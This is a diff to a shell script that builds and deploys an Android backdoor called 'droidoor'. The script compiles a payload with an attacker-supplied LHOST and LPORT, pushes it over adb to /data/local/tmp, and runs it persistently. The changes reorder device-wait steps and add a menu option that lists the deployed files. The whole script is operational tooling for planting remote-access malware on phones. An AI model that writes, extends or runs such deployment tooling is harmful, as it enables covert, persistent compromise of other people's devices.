@@ -83,15 +83,18 @@ main () {
     show_banner
     check_requirements
 
+    local target_dir="/data/local/tmp"
+    local default_name="droidoor"
+
     echo -e "Select action:"
     echo "1) Build & Deploy (New IP/Port)"
     echo "2) Quick Deploy (Use existing ./bin/droidoor)"
     echo "3) Just Run (If already on device)"
     echo "4) Just Build (No deploy)"
+    echo "5) Show lists of file in '$target_dir'"
     read -p ">> " action
 
-    local target_dir="/data/local/tmp"
-    local default_name="droidoor"
+
 
     case "$action" in
         1)
@@ -99,10 +102,12 @@ main () {
             read -p "Enter LPORT: " USER_PORT
             build_payload "-DTARGET_IP=\"$USER_IP\" -DTARGET_PORT=$USER_PORT"
             
-            wait_for_device
             read -p "Remote name [$default_name]: " r_name
             local final_name=${r_name:-$default_name}
             local remote_path="$target_dir/$final_name"
+            
+            wait_for_device
+            
 
             info "Pushing to device..."
             adb push "$OUT_BIN" "$remote_path"
@@ -113,10 +118,11 @@ main () {
         2)
             [ ! -f "$OUT_BIN" ] && error "No binary found in ./bin/. Build it first!"
             
-            wait_for_device
             read -p "Remote name [$default_name]: " r_name
             local final_name=${r_name:-$default_name}
             local remote_path="$target_dir/$final_name"
+
+            wait_for_device
 
             info "Quick pushing..."
             adb push "$OUT_BIN" "$remote_path"
@@ -125,10 +131,11 @@ main () {
             ;;
 
         3)
-            wait_for_device
             read -p "Remote name to run [$default_name]: " r_name
             local final_name=${r_name:-$default_name}
             local remote_path="$target_dir/$final_name"
+
+            wait_for_device
 
             if adb shell "[ -f $remote_path ]" 2>/dev/null; then
                 run_payload_persistently "$remote_path"
@@ -140,6 +147,11 @@ main () {
             read -p "Enter LHOST: " USER_IP
             read -p "Enter LPORT: " USER_PORT
             build_payload "-DTARGET_IP=\"$USER_IP\" -DTARGET_PORT=$USER_PORT"
+            ;;
+        5)
+            wait_for_device
+            info "Files in $target_dir: "
+            adb shell "ls $target_dir"
             ;;
         *)
             error "Unknown action."
